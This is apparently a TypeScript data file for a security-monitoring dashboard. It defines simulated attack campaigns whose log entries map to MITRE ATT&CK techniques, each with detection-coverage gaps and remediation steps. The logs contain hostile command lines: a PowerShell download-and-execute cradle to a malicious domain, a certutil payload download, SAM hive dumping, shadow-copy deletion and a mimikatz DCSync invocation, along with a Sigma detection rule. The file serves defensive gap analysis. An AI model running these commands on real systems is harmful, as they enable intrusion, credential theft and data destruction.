export interface Tactic {
  id: string;
  name: string;
}

export interface Technique {
  id: string;
  name: string;
}

export interface MitreAttack {
  tactic: Tactic;
  technique: Technique;
}

export interface Remediation {
  title: string;
  impact: string;
  steps: string[];
  cmd?: string;
}

export interface CoverageDetails {
  status: 'full_coverage' | 'partial_coverage' | 'no_coverage';
  gap_id?: string;
  summary?: string;
  gap_reason: string | null;
  remediation?: Remediation;
  alert_id?: string;
  rule_name?: string;
}

export interface Host {
  name: string;
}

export interface Event {
  category?: string;
  type?: string;
  action: string;
}

export interface Process {
  name?: string;
  pid?: number;
  executable?: string;
  command_line?: string;
  parent?: {
    name?: string;
    pid?: number;
  };
  target?: {
    name?: string;
    pid?: number;
  };
  granted_access?: string;
}

export interface Network {
  bytes_written?: number;
}

export interface LogEntry {
  '@timestamp': string;
  'log.level': string;
  event: Event;
  host: Host;
  user?: {
    name?: string;
  };
  process?: Process;
  registry?: {
    path?: string;
    value?: string;
  };
  source?: {
    ip?: string;
    port?: number;
  };
  destination?: {
    ip?: string;
    port?: number;
    name?: string;
  };
  http?: {
    request?: {
      method?: string;
      uri?: string;
    };
    response?: {
      status_code?: number;
    };
  };
  network?: Network;
  app?: {
    name?: string;
    id?: string;
  };
  api?: {
    scope?: string;
  };
  mailbox?: {
    owner?: string;
  };
  message: string;
  mitre_attack?: MitreAttack;
  detection_status: 'Monitored' | 'Alerted' | 'Blind Spot';
  coverage_details: CoverageDetails;
}

export interface Campaign {
  name: string;
  description: string;
  metrics: {
    total: number;
    covered: number;
    gaps: number;
    blindspots: number;
  };
  logs: LogEntry[];
}

export const CAMPAIGNS: Record<string, Campaign> = {
  apt29: {
    name: "APT29 (Spearphishing & Lateral Movement)",
    description: "Simulates an advanced threat actor entering through a phishing attachment, running malicious PowerShell payloads, dumping credentials, and laterally moving using Windows Remote Management (WinRM).",
    metrics: {
      total: 6,
      covered: 3,
      gaps: 1,
      blindspots: 2
    },
    logs: [
      {
        "@timestamp": "2026-05-24T14:02:15.120Z",
        "log.level": "info",
        "event": {
          "category": "process",
          "type": "start",
          "action": "process-created"
        },
        "host": { "name": "DESKTOP-WK-912" },
        "user": { "name": "bwandt" },
        "process": {
          "name": "outlook.exe",
          "pid": 4812,
          "executable": "C:\\Program Files\\Microsoft Office\\root\\Office16\\outlook.exe",
          "command_line": "\"C:\\Program Files\\Microsoft Office\\root\\Office16\\outlook.exe\" /select outlook:calendar"
        },
        "message": "Process outlook.exe started by user bwandt",
        "mitre_attack": {
          "tactic": { "id": "TA0001", "name": "Initial Access" },
          "technique": { "id": "T1566.001", "name": "Phishing: Spearphishing Attachment" }
        },
        "detection_status": "Monitored",
        "coverage_details": {
          "status": "partial_coverage",
          "gap_id": "GAP-APT-01",
          "summary": "Email Telemetry Blind Spot",
          "gap_reason": "Process creation event captured, but email gateway headers and attachment hashes are not integrated into the SIEM logs, causing a blind spot for the original entry vector.",
          "remediation": {
            "title": "Ingest Email Gateway Logs & Enable Attachment Auditing",
            "impact": "Resolves blind spots regarding attachment sender details, attachment file hashes, and sender IP geolocation.",
            "steps": [
              "Configure Microsoft Defender for Office 365 or your Secure Email Gateway (SEG) to stream audit logs to the SIEM via API/Event Hub.",
              "Enable Exchange Online Mailbox auditing (Audit log Search) in Microsoft Purview.",
              "Deploy registry policies to log Outlook attachment save events (Process Event ID 11 - File Created via Sysmon)."
            ],
            "cmd": "Set-Mailbox -Identity \"bwandt\" -AuditEnabled $true\nSet-Mailbox -Identity \"bwandt\" -AuditOwner Update,Move,MoveToDeletedItems,SoftDelete,HardDelete,SendAs,SendOnBehalf"
          }
        }
      },
      {
        "@timestamp": "2026-05-24T14:04:32.410Z",
        "log.level": "warning",
        "event": {
          "category": "process",
          "type": "start",
          "action": "process-created"
        },
        "host": { "name": "DESKTOP-WK-912" },
        "user": { "name": "bwandt" },
        "process": {
          "name": "powershell.exe",
          "pid": 6024,
          "parent": {
            "name": "outlook.exe",
            "pid": 4812
          },
          "executable": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
          "command_line": "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -Command \"& {IEX (New-Object Net.WebClient).DownloadString('http://external-malicious-domain.com/payload.ps1')}\""
        },
        "message": "Suspicious process spawning: outlook.exe spawned powershell.exe",
        "mitre_attack": {
          "tactic": { "id": "TA0002", "name": "Execution" },
          "technique": { "id": "T1059.001", "name": "Command and Scripting Interpreter: PowerShell" }
        },
        "detection_status": "Alerted",
        "coverage_details": {
          "status": "full_coverage",
          "alert_id": "AL-8832-PWR",
          "rule_name": "Suspicious Child Process Spawning from Microsoft Office App",
          "gap_reason": null
        }
      },
      {
        "@timestamp": "2026-05-24T14:05:01.002Z",
        "log.level": "info",
        "event": {
          "category": "registry",
          "type": "change",
          "action": "registry-key-modified"
        },
        "host": { "name": "DESKTOP-WK-912" },
        "user": { "name": "SYSTEM" },
        "registry": {
          "path": "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\WindowsUpdateAgent",
          "value": "C:\\Users\\bwandt\\AppData\\Local\\Temp\\update_agent.exe"
        },
        "message": "Registry Run key added/modified: WindowsUpdateAgent pointing to C:\\Users\\bwandt\\AppData\\Local\\Temp\\update_agent.exe",
        "mitre_attack": {
          "tactic": { "id": "TA0003", "name": "Persistence" },
          "technique": { "id": "T1547.001", "name": "Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder" }
        },
        "detection_status": "Monitored",
        "coverage_details": {
          "status": "full_coverage",
          "rule_name": "Registry Persistence - Run Keys Modification",
          "gap_reason": null
        }
      },
      {
        "@timestamp": "2026-05-24T14:08:11.890Z",
        "log.level": "critical",
        "event": {
          "category": "iam",
          "type": "access",
          "action": "lsass-memory-read"
        },
        "host": { "name": "DESKTOP-WK-912" },
        "user": { "name": "SYSTEM" },
        "process": {
          "name": "update_agent.exe",
          "pid": 7180,
          "target": {
            "name": "lsass.exe",
            "pid": 820
          },
          "granted_access": "0x1F0FFF"
        },
        "message": "Process update_agent.exe requested access to LSASS process memory (Sysmon Event ID 10)",
        "mitre_attack": {
          "tactic": { "id": "TA0006", "name": "Credential Access" },
          "technique": { "id": "T1003.001", "name": "OS Credential Dumping: LSASS Memory" }
        },
        "detection_status": "Alerted",
        "coverage_details": {
          "status": "full_coverage",
          "alert_id": "AL-8991-LSA",
          "rule_name": "LSASS Memory Access via Non-Standard Executable",
          "gap_reason": null
        }
      },
      {
        "@timestamp": "2026-05-24T14:12:30.550Z",
        "log.level": "error",
        "event": {
          "category": "network",
          "type": "connection",
          "action": "network-connection-initiated"
        },
        "host": { "name": "DESKTOP-WK-912" },
        "user": { "name": "bwandt" },
        "process": {
          "name": "update_agent.exe",
          "pid": 7180
        },
        "source": {
          "ip": "192.168.10.15",
          "port": 49830
        },
        "destination": {
          "ip": "192.168.10.2",
          "port": 5985,
          "name": "CORP-DC-01"
        },
        "message": "Network connection to CORP-DC-01 (192.168.10.2) on port 5985 (WinRM) initiated by update_agent.exe",
        "mitre_attack": {
          "tactic": { "id": "TA0008", "name": "Lateral Movement" },
          "technique": { "id": "T1021.006", "name": "Remote Services: Windows Remote Management" }
        },
        "detection_status": "Blind Spot",
        "coverage_details": {
          "status": "no_coverage",
          "gap_id": "GAP-APT-02",
          "summary": "Target Host Remote Management Logging Disabled",
          "gap_reason": "WinRM target auditing (Event ID 400 or WinRM Operational Logs) is disabled on CORP-DC-01. The network connection was logged on the source workstation, but there is no telemetry indicating what commands were executed on the target host.",
          "remediation": {
            "title": "Enable WinRM Operational Logging & Cmd Auditing",
            "impact": "Restores full visibility on execution when WinRM/PowerShell Remoting is used for lateral movement.",
            "steps": [
              "Enable the Event Channel 'Microsoft-Windows-WinRM/Operational' via Group Policy on all servers.",
              "Configure audit policy: Computer Configuration -> Policies -> Windows Settings -> Security Settings -> Advanced Audit Policy Configuration -> System Audit Policies -> Detailed Tracking -> Audit Process Creation (Success & Failure).",
              "Turn on PowerShell Script Block Logging (Event ID 4104)."
            ],
            "cmd": "wevtutil sl Microsoft-Windows-WinRM/Operational /e:true\nreg add \"HKLM\\Software\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging\" /v EnableScriptBlockLogging /t REG_DWORD /d 1 /f"
          }
        }
      },
      {
        "@timestamp": "2026-05-24T14:15:00.000Z",
        "log.level": "info",
        "event": {
          "category": "network",
          "type": "connection",
          "action": "data-sent"
        },
        "host": { "name": "DESKTOP-WK-912" },
        "process": {
          "name": "update_agent.exe",
          "pid": 7180
        },
        "source": {
          "ip": "192.168.10.15"
        },
        "destination": {
          "ip": "203.0.113.88",
          "port": 443
        },
        "network": {
          "bytes_written": 250000000
        },
        "message": "Outbound connection to 203.0.113.88 on port 443 uploaded 250MB of data",
        "mitre_attack": {
          "tactic": { "id": "TA0010", "name": "Exfiltration" },
          "technique": { "id": "T1048.002", "name": "Exfiltration Over Alternative Protocol: Exfiltration Over Asymmetric Encrypted Channel" }
        },
        "detection_status": "Blind Spot",
        "coverage_details": {
          "status": "no_coverage",
          "gap_id": "GAP-APT-03",
          "summary": "SSL/TLS Egress Traffic Decryption Missing",
          "gap_reason": "No egress firewall proxy logs are integrated, and SSL decryption is disabled. The SIEM is blind to large volume encrypted uploads (HTTPS Exfiltration) coming from standard endpoint workstations.",
          "remediation": {
            "title": "Enable SSL Decryption & Stream Egress Traffic Logs",
            "impact": "Exposes encrypted payloads, destination URLs, and detects exfiltration patterns over HTTPS.",
            "steps": [
              "Deploy SSL inspection certificates to workstations via GPO.",
              "Configure NetFlow/IPFIX forwarding from gateway firewalls to capture upload sizes.",
              "Integrate Web Proxy / NGFW logs (e.g., Zscaler, Palo Alto) to monitor outbound URL reputations."
            ],
            "cmd": "# Configure Cisco ASA NetFlow export (Example CLI snippet)\nflow-export destination inside 192.168.10.5 2055\npolicy-map global_policy\n class class-default\n  flow-export event-type all destination 192.168.10.5"
          }
        }
      }
    ]
  },
  
  ransomware: {
    name: "Ransomware Attack (BlackCat/ALPHV Style)",
    description: "Simulates a server intrusion via an unpatched web vulnerability, followed by credential stealing, shadow copy deletion, and host-wide encryption.",
    metrics: {
      total: 5,
      covered: 2,
      gaps: 2,
      blindspots: 1
    },
    logs: [
      {
        "@timestamp": "2026-05-24T15:20:00.105Z",
        "log.level": "warning",
        "event": {
          "category": "web",
          "type": "access",
          "action": "http-request"
        },
        "host": { "name": "CORP-WEB-02" },
        "source": { "ip": "45.9.20.100" },
        "http": {
          "request": {
            "method": "POST",
            "uri": "/upload.aspx"
          },
          "response": {
            "status_code": 200
          }
        },
        "message": "HTTP POST request to vulnerable endpoint /upload.aspx from IP 45.9.20.100 returned 200 OK",
        "mitre_attack": {
          "tactic": { "id": "TA0001", "name": "Initial Access" },
          "technique": { "id": "T1190", "name": "Exploit Public-Facing Application" }
        },
        "detection_status": "Monitored",
        "coverage_details": {
          "status": "partial_coverage",
          "gap_id": "GAP-RANS-01",
          "summary": "Web Application Firewall (WAF) Logs Mismatched",
          "gap_reason": "IIS Web Server logs are received, but the fronting WAF logs containing HTTP request payload data are not ingested, creating a gap in understanding what exploit payload was delivered.",
          "remediation": {
            "title": "Ingest WAF Payloads & Enable Request Inspections",
            "impact": "Exposes exploit patterns, SQL Injection, and Remote Code Execution attempts in HTTP bodies.",
            "steps": [
              "Configure Cloudflare / AWS WAF / F5 BIG-IP log forwarder.",
              "Turn on HTTP POST request body inspection rules.",
              "Map WAF alert events directly to the SIEM alerting index."
            ],
            "cmd": "# Azure Application Gateway WAF Ingestion (Diagnostic Settings CLI)\naz monitor diagnostic-settings create --name \"WAFLogsToSIEM\" --resource \"/subscriptions/.../resourceGroups/.../providers/Microsoft.Network/applicationGateways/CORP-WAF\" --workspace \"/subscriptions/.../workspaces/SIEM-Workspace\" --logs \"[{\\'category\\':\\'ApplicationGatewayFirewallLog\\',\\'enabled\\':true}]\""
          }
        }
      },
      {
        "@timestamp": "2026-05-24T15:22:15.000Z",
        "log.level": "info",
        "event": {
          "category": "process",
          "type": "start",
          "action": "process-created"
        },
        "host": { "name": "CORP-WEB-02" },
        "user": { "name": "IIS_IUSRS" },
        "process": {
          "name": "certutil.exe",
          "pid": 5510,
          "command_line": "certutil.exe -urlcache -f http://45.9.20.100/ransom.exe C:\\Windows\\Temp\\update.exe"
        },
        "message": "certutil.exe downloaded payload from remote server (Ingress Tool Transfer)",
        "mitre_attack": {
          "tactic": { "id": "TA0011", "name": "Command and Control" },
          "technique": { "id": "T1105", "name": "Ingress Tool Transfer" }
        },
        "detection_status": "Blind Spot",
        "coverage_details": {
          "status": "no_coverage",
          "gap_id": "GAP-RANS-02",
          "summary": "Living-off-the-Land Binary (LOLBIN) Execution Blind Spot",
          "gap_reason": "Endpoint Detection and Response (EDR) policy ignores system utilities like certutil.exe when spawned by service accounts, bypassing basic anomaly triggers.",
          "remediation": {
            "title": "Implement LOLBAS Auditing and Alerting Rules",
            "impact": "Stops attackers from using trusted native Windows tools to download malware.",
            "steps": [
              "Enable EDR rules specifically monitoring LOLBAS binaries (certutil, bitsadmin, mshta) initiating external HTTP connections.",
              "Create a correlation rule in SIEM matching certutil execution with command line parameters containing '-urlcache' or '-ping'."
            ],
            "cmd": "# Sigma Rule Snippet for Certutil Download\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection:\n        Image|endswith: '\\certutil.exe'\n        CommandLine|contains:\n            - '-urlcache'\n            - '-split'\n            - '-ping'\n    condition: selection"
          }
        }
      },
      {
        "@timestamp": "2026-05-24T15:25:30.900Z",
        "log.level": "warning",
        "event": {
          "category": "process",
          "type": "start",
          "action": "process-created"
        },
        "host": { "name": "CORP-WEB-02" },
        "user": { "name": "SYSTEM" },
        "process": {
          "name": "cmd.exe",
          "pid": 8904,
          "command_line": "cmd.exe /c reg save HKLM\\SAM C:\\Windows\\Temp\\sam.hiv && reg save HKLM\\SYSTEM C:\\Windows\\Temp\\sys.hiv"
        },
        "message": "SAM database Registry backup attempt detected via reg.exe",
        "mitre_attack": {
          "tactic": { "id": "TA0006", "name": "Credential Access" },
          "technique": { "id": "T1003.002", "name": "OS Credential Dumping: Security Account Manager" }
        },
        "detection_status": "Alerted",
        "coverage_details": {
          "status": "full_coverage",
          "alert_id": "AL-9221-SAM",
          "rule_name": "SAM Database Hive Backup Registry Dump Attempt",
          "gap_reason": null
        }
      },
      {
        "@timestamp": "2026-05-24T15:28:10.021Z",
        "log.level": "critical",
        "event": {
          "category": "process",
          "type": "start",
          "action": "process-created"
        },
        "host": { "name": "CORP-WEB-02" },
        "user": { "name": "SYSTEM" },
        "process": {
          "name": "vssadmin.exe",
          "pid": 9102,
          "command_line": "vssadmin.exe delete shadows /all /quiet"
        },
        "message": "Volume Shadow Copy deletion initiated (vssadmin.exe)",
        "mitre_attack": {
          "tactic": { "id": "TA0040", "name": "Impact" },
          "technique": { "id": "T1486", "name": "Data Encrypted for Impact" }
        },
        "detection_status": "Alerted",
        "coverage_details": {
          "status": "full_coverage",
          "alert_id": "AL-9502-VSS",
          "rule_name": "Volume Shadow Copy Deletion via Vssadmin",
          "gap_reason": null
        }
      },
      {
        "@timestamp": "2026-05-24T15:28:15.110Z",
        "log.level": "info",
        "event": {
          "category": "file",
          "action": "file-renamed"
        },
        "host": { "name": "CORP-WEB-02" },
        "message": "Bulk file modification detected: 489 files renamed to '.lockbit' extension within 5 seconds",
        "mitre_attack": {
          "tactic": { "id": "TA0040", "name": "Impact" },
          "technique": { "id": "T1486", "name": "Data Encrypted for Impact" }
        },
        "detection_status": "Monitored",
        "coverage_details": {
          "status": "partial_coverage",
          "gap_id": "GAP-RANS-03",
          "summary": "Real-time File Integrity Monitoring Latency",
          "gap_reason": "File integrity monitoring (FIM) tools recorded the file extensions changing, but they lack active behavioral isolation (e.g. rate-limiting process I/O) to intercept ransomware execution before files are locked.",
          "remediation": {
            "title": "Deploy EDR Anti-Ransomware Behavioral Rules",
            "impact": "Actively terminates processes exhibiting high-frequency file rename/write patterns on critical data shares.",
            "steps": [
              "Enable Ransomware Protection modules on endpoint EDR agents.",
              "Configure file-change threshold honeypots (canary files) in file servers to trigger instant isolation upon edit."
            ],
            "cmd": "# Enable Controlled Folder Access (PowerShell Command)\nSet-MpPreference -EnableControlledFolderAccess Enabled"
          }
        }
      }
    ]
  },

  cloud: {
    name: "Cloud Exfiltration & Tenant Takeover",
    description: "Simulates an attacker compromising an Entra ID (Azure AD) administrator account, bypassing MFA, adding a backdoor App registration, and querying Exchange mailboxes via Graph API.",
    metrics: {
      total: 5,
      covered: 2,
      gaps: 2,
      blindspots: 1
    },
    logs: [
      {
        "@timestamp": "2026-05-24T16:01:00.000Z",
        "log.level": "warning",
        "event": {
          "category": "iam",
          "type": "login",
          "action": "user-login-failed"
        },
        "host": { "name": "EntraID-Tenant-01" },
        "user": { "name": "admin@company.onmicrosoft.com" },
        "source": { "ip": "185.220.101.44" },
        "message": "Failed login attempt for admin@company.onmicrosoft.com from Tor Exit Node IP 185.220.101.44",
        "mitre_attack": {
          "tactic": { "id": "TA0001", "name": "Initial Access" },
          "technique": { "id": "T1078.004", "name": "Valid Accounts: Cloud Accounts" }
        },
        "detection_status": "Alerted",
        "coverage_details": {
          "status": "full_coverage",
          "alert_id": "AL-5510-ENTRA",
          "rule_name": "Failed Login from Known Tor Exit Node",
          "gap_reason": null
        }
      },
      {
        "@timestamp": "2026-05-24T16:02:11.450Z",
        "log.level": "info",
        "event": {
          "category": "iam",
          "type": "login",
          "action": "user-login-successful"
        },
        "host": { "name": "EntraID-Tenant-01" },
        "user": { "name": "admin@company.onmicrosoft.com" },
        "source": { "ip": "185.220.101.44" },
        "message": "Successful login for admin@company.onmicrosoft.com following MFA Push Notification approval",
        "mitre_attack": {
          "tactic": { "id": "TA0006", "name": "Credential Access" },
          "technique": { "id": "T1111", "name": "Adversary-in-the-Middle: Multi-Factor Authentication Bypass" }
        },
        "detection_status": "Monitored",
        "coverage_details": {
          "status": "partial_coverage",
          "gap_id": "GAP-CLD-01",
          "summary": "MFA Response Context Missing",
          "gap_reason": "Microsoft Entra Sign-In logs track success/failure, but Microsoft Authenticator push notification context (device information, prompt timings) is not ingested into the security index, leaving a blind spot for MFA push fatigue details.",
          "remediation": {
            "title": "Enable Entra ID MFA Context Ingestion",
            "impact": "Exposes whether an admin was bombarded with requests (fatigue) or approved an out-of-context push notification.",
            "steps": [
              "Enable diagnostic logs streaming for 'AADNonInteractiveUserSignInLogs' and 'EnrichedOffice365AuditLogs'.",
              "Enforce 'Number Matching' in Microsoft Authenticator configuration to stop push fatigue completely."
            ],
            "cmd": "# Turn on Microsoft Entra ID MFA Number Matching (Microsoft Graph PowerShell)\nUpdate-MgPolicyIdentityConditionalAccessPolicy -ConditionalAccessPolicyId \"MFA-Policy-ID\" ... # Enforce MFA registration settings"
          }
        }
      },
      {
        "@timestamp": "2026-05-24T16:05:40.890Z",
        "log.level": "info",
        "event": {
          "category": "iam",
          "type": "change",
          "action": "application-credential-added"
        },
        "host": { "name": "EntraID-Tenant-01" },
        "user": { "name": "admin@company.onmicrosoft.com" },
        "app": {
          "name": "OfficeMailSync-Integration",
          "id": "d88e001a-9fbc-499e-a89e-2a2f901198fe"
        },
        "message": "New client secret added to Application Registration: OfficeMailSync-Integration",
        "mitre_attack": {
          "tactic": { "id": "TA0003", "name": "Persistence" },
          "technique": { "id": "T1098.001", "name": "Account Manipulation: Additional Cloud Credentials" }
        },
        "detection_status": "Blind Spot",
        "coverage_details": {
          "status": "no_coverage",
          "gap_id": "GAP-CLD-02",
          "summary": "Directory Audit Logs Forwarder Disconnected",
          "gap_reason": "Entra ID AuditLogs (Directory Activities) are not forwarded to the primary SIEM, causing absolute blindness to administrative tenant changes, including application permission modifications and credential additions.",
          "remediation": {
            "title": "Connect Microsoft Entra ID Audit Logs to SIEM",
            "impact": "Ensures real-time notifications for Application creation, credential manipulation, and role additions.",
            "steps": [
              "Go to Entra ID -> Diagnostic settings.",
              "Click 'Add diagnostic setting' -> Select 'AuditLogs' and 'DirectoryLogs'.",
              "Configure destination: Event Hub, Log Analytics workspace, or HTTPS Partner Endpoint."
            ],
            "cmd": "# CLI Command to configure Entra Diagnostic Streaming\naz monitor diagnostic-settings create --name \"EntraAuditToSIEM\" --resource \"/providers/Microsoft.Directory/AuditLogs\" --workspace \"SIEM-Log-Analytics\""
          }
        }
      },
      {
        "@timestamp": "2026-05-24T16:08:12.300Z",
        "log.level": "info",
        "event": {
          "category": "iam",
          "type": "access",
          "action": "api-access"
        },
        "host": { "name": "Graph-API-Gateway" },
        "app": {
          "id": "d88e001a-9fbc-499e-a89e-2a2f901198fe"
        },
        "api": {
          "scope": "Mail.ReadWrite, MailboxSettings.Read"
        },
        "message": "Application OfficeMailSync-Integration requested Mail.ReadWrite scope access to mailboxes via Microsoft Graph API",
        "mitre_attack": {
          "tactic": { "id": "TA0009", "name": "Collection" },
          "technique": { "id": "T1114.002", "name": "Email Collection: Mailbox Search" }
        },
        "detection_status": "Monitored",
        "coverage_details": {
          "status": "full_coverage",
          "rule_name": "High-Privilege Graph API Scope Requested",
          "gap_reason": null
        }
      },
      {
        "@timestamp": "2026-05-24T16:11:05.120Z",
        "log.level": "info",
        "event": {
          "category": "email",
          "type": "access",
          "action": "mailbox-queried"
        },
        "host": { "name": "Exchange-Online" },
        "app": {
          "name": "OfficeMailSync-Integration"
        },
        "mailbox": {
          "owner": "ceo@company.com"
        },
        "message": "Application read 142 emails from mailbox: ceo@company.com",
        "mitre_attack": {
          "tactic": { "id": "TA0009", "name": "Collection" },
          "technique": { "id": "T1114.002", "name": "Email Collection: Mailbox Search" }
        },
        "detection_status": "Blind Spot",
        "coverage_details": {
          "status": "no_coverage",
          "gap_id": "GAP-CLD-03",
          "summary": "Exchange Mailbox Access Auditing Disabled",
          "gap_reason": "Exchange Online Mailbox Audit logs (specifically MailItemsAccessed events) are not streamed to the SIEM due to license tier limitations, making it impossible to audit which emails were exfiltrated by a compromised app.",
          "remediation": {
            "title": "Enable Exchange Mailbox Item Access Auditing (MailItemsAccessed)",
            "impact": "Exposes exact email access logs for forensic investigation when applications or accounts are compromised.",
            "steps": [
              "Verify tenant has Microsoft 365 E5 or Audit (Premium) license.",
              "Enable Exchange Online Mailbox audit configuration for all mailboxes.",
              "Ensure 'MailItemsAccessed' action is checked in audit settings."
            ],
            "cmd": "Set-Mailbox -Identity \"ceo@company.com\" -AuditOwner @{Add=\"MailItemsAccessed\"}\n# Verify audit settings\nGet-Mailbox -Identity \"ceo@company.com\" | Select-Object -ExpandProperty AuditOwner"
          }
        }
      }
    ]
  },
  active_directory_escalation: {
    name: "Active Directory Domain Escalation",
    description: "Simulates an internal threat actor leveraging Kerberoasting (weak RC4 ticket encryption) to obtain service credentials, performing lateral movement via RDP, and executing a DCSync replication request to dump the entire domain database.",
    metrics: {
      total: 5,
      covered: 2,
      gaps: 2,
      blindspots: 1
    },
    logs: [
      {
        "@timestamp": "2026-05-24T17:01:00.120Z",
        "log.level": "warning",
        "event": {
          "category": "identity",
          "type": "access",
          "action": "ticket-requested"
        },
        "host": { "name": "CORP-DC-01" },
        "user": { "name": "compromised_user" },
        "process": {
          "name": "lsass.exe"
        },
        "message": "Kerberos Service Ticket Request (Event ID 4769) requesting weak RC4 (0x17) encryption for SQL Service account.",
        "mitre_attack": {
          "tactic": { "id": "TA0006", "name": "Credential Access" },
          "technique": { "id": "T1558.003", "name": "Steal or Forge Kerberos Tickets: Kerberoasting" }
        },
        "detection_status": "Alerted",
        "coverage_details": {
          "status": "full_coverage",
          "rule_name": "Active Directory Kerberoasting via Ticket Requests",
          "gap_reason": null
        }
      },
      {
        "@timestamp": "2026-05-24T17:02:15.000Z",
        "log.level": "critical",
        "event": {
          "category": "process",
          "type": "start",
          "action": "process-created"
        },
        "host": { "name": "DESKTOP-DEV-41" },
        "user": { "name": "sql_service" },
        "process": {
          "name": "cmd.exe",
          "pid": 9912,
          "command_line": "cmd.exe /c mimikatz.exe \"lsadump::dcsync /domain:corp.local /user:krbtgt\" exit"
        },
        "message": "Anomalous process creation: Command prompt running Mimikatz DCSync arguments.",
        "mitre_attack": {
          "tactic": { "id": "TA0006", "name": "Credential Access" },
          "technique": { "id": "T1003", "name": "OS Credential Dumping" }
        },
        "detection_status": "Blind Spot",
        "coverage_details": {
          "status": "no_coverage",
          "gap_id": "GAP-AD-03",
          "summary": "Mimikatz Process Auditing Bypass",
          "gap_reason": "Mimikatz process execution occurred inside a non-standard developer directory where host EDR script block audits were disabled, preventing command line parameter capture in SIEM.",
          "remediation": {
            "title": "Enable Universal EDR Auditing and Restrict Admin Access",
            "impact": "Exposes unauthorized Mimikatz usage, preventing DCSync domain replication dumps.",
            "steps": [
              "Revoke local admin privileges on developer endpoints.",
              "Enforce EDR heuristic audits globally on all directories (no exclusion parameters)."
            ],
            "cmd": "# Enable Local PowerShell transcription audits via registry\nreg add \"HKLM\\Software\\Policies\\Microsoft\\Windows\\PowerShell\\Transcription\" /v EnableTranscripting /t REG_DWORD /d 1 /f"
          }
        }
      },
      {
        "@timestamp": "2026-05-24T17:03:40.890Z",
        "log.level": "info",
        "event": {
          "category": "directory",
          "action": "directory-replication-requested"
        },
        "host": { "name": "CORP-DC-01" },
        "user": { "name": "sql_service" },
        "message": "Domain controller replication request (Event ID 4662) for Control Access right 'Replicating Directory Changes All'.",
        "mitre_attack": {
          "tactic": { "id": "TA0006", "name": "Credential Access" },
          "technique": { "id": "T1003.006", "name": "OS Credential Dumping: DCSync" }
        },
        "detection_status": "Monitored",
        "coverage_details": {
          "status": "partial_coverage",
          "gap_id": "GAP-AD-01",
          "summary": "AD Directory Service Auditing Missing",
          "gap_reason": "Active Directory Service replication changes are enabled, but the System Access Control List (SACL) on the Active Directory Domain object is missing the Audit entry for the Replicating Directory Changes extended right.",
          "remediation": {
            "title": "Configure SACL Audit Settings on Active Directory Root",
            "impact": "Logs successful and failed non-DC directory replication attempts in AD Security events.",
            "steps": [
              "Open ADSI Edit or Active Directory Users and Computers.",
              "Right click Domain root node -> Properties -> Security -> Advanced -> Auditing.",
              "Add Principal 'Everyone' -> Type: Success -> Access: Replicating Directory Changes."
            ]
          }
        }
      },
      {
        "@timestamp": "2026-05-24T17:05:00.000Z",
        "log.level": "info",
        "event": {
          "category": "identity",
          "action": "user-login-successful"
        },
        "host": { "name": "CORP-DC-01" },
        "user": { "name": "sql_service" },
        "source": { "ip": "192.168.10.45" },
        "message": "Successful RDP logon (Event ID 4624 Logon Type 10) by user sql_service from source 192.168.10.45.",
        "mitre_attack": {
          "tactic": { "id": "TA0008", "name": "Lateral Movement" },
          "technique": { "id": "T1021.001", "name": "Remote Services: Remote Desktop Protocol" }
        },
        "detection_status": "Monitored",
        "coverage_details": {
          "status": "full_coverage",
          "rule_name": "RDP Connection to Domain Controller via Non-Standard Account",
          "gap_reason": null
        }
      },
      {
        "@timestamp": "2026-05-24T17:08:12.300Z",
        "log.level": "info",
        "event": {
          "category": "identity",
          "action": "user-account-created"
        },
        "host": { "name": "CORP-DC-01" },
        "user": { "name": "sql_service" },
        "message": "New domain user created (Event ID 4720): Target account 'backdoor_admin'.",
        "mitre_attack": {
          "tactic": { "id": "TA0003", "name": "Persistence" },
          "technique": { "id": "T1136.002", "name": "Create Account: Domain Account" }
        },
        "detection_status": "Monitored",
        "coverage_details": {
          "status": "partial_coverage",
          "gap_id": "GAP-AD-02",
          "summary": "Domain User Creation GPO Auditing Disabled",
          "gap_reason": "Domain member additions are logged, but the Advanced Audit Policy Configuration for User Account Management is not replicated to all backup domain controllers, causing missing events if backup DCs process the request.",
          "remediation": {
            "title": "Enable Audit User Account Management policy via GPO",
            "impact": "Forces Windows Domain Controllers to log account additions.",
            "steps": [
              "Configure GPO -> Advanced Audit Policy Configuration -> Account Management -> Audit User Account Management (Success & Failure).",
              "Sync Group Policy objects across all domain controllers."
            ]
          }
        }
      }
    ]
  },
  dns_tunneling_c2: {
    name: "DNS Tunneling & C2 Exfiltration",
    description: "Simulates an endpoint infected with malware utilizing DNS tunneling to establish a persistent Command and Control (C2) channel and exfiltrate sensitive files disguised as long TXT and CNAME DNS query packets.",
    metrics: {
      total: 4,
      covered: 2,
      gaps: 1,
      blindspots: 1
    },
    logs: [
      {
        "@timestamp": "2026-05-24T18:01:10.120Z",
        "log.level": "info",
        "event": {
          "category": "process",
          "type": "start",
          "action": "process-created"
        },
        "host": { "name": "DESKTOP-WK-912" },
        "user": { "name": "bwandt" },
        "process": {
          "name": "powershell.exe",
          "pid": 11024,
          "command_line": "powershell.exe -ep bypass -command \"while($true){ Resolve-DnsName -Name (Get-Random).toString() -Type TXT; Start-Sleep -s 5 }\""
        },
        "message": "PowerShell process spawned executing automated network resolution loop.",
        "mitre_attack": {
          "tactic": { "id": "TA0002", "name": "Execution" },
          "technique": { "id": "T1059.001", "name": "Command and Scripting Interpreter: PowerShell" }
        },
        "detection_status": "Monitored",
        "coverage_details": {
          "status": "full_coverage",
          "rule_name": "Suspicious Child Process Spawning from Microsoft Office App",
          "gap_reason": null
        }
      },
      {
        "@timestamp": "2026-05-24T18:02:15.000Z",
        "log.level": "warning",
        "event": {
          "category": "network",
          "action": "dns-query-sent"
        },
        "host": { "name": "DESKTOP-WK-912" },
        "destination": { "name": "e2c39d82fb10a459b9cd837de821c9d8a3be019cd82fab409cd83a09e.attacker-domain.com" },
        "message": "DNS Query sent: CNAME record request for query length 90 characters.",
        "mitre_attack": {
          "tactic": { "id": "TA0011", "name": "Command & Control" },
          "technique": { "id": "T1071.004", "name": "Application Layer Protocol: DNS Traffic" }
        },
        "detection_status": "Alerted",
        "coverage_details": {
          "status": "full_coverage",
          "rule_name": "Suspicious DNS Tunneling Query Activity",
          "gap_reason": null
        }
      },
